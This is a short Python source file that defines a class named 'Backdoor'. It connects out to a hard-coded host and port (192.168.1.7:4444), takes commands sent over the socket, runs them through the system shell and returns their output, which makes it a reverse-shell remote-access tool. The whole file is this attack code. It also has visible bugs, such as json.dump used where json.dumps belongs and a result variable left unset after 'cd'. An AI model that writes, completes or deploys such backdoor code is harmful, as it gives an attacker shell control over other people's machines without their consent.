import socket
import subprocess,json, os

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b"[+] Connection Successful\n\n")
    
    def safe_send(self, data):
        self.connection.send(json.dump(data))
    
    def safe_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024).decode("UTF-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def change_path(self, path):
        os.chdir(path)
        return "[+] CHanging Path to " + path

    def run_system_commands(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.safe_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                self.change_path(command[1])
            else:
                command_result = self.run_system_commands(command)
            
            self.safe_send(command_result)

my_backdoor = Backdoor("192.168.1.7", 4444)
my_backdoor.run()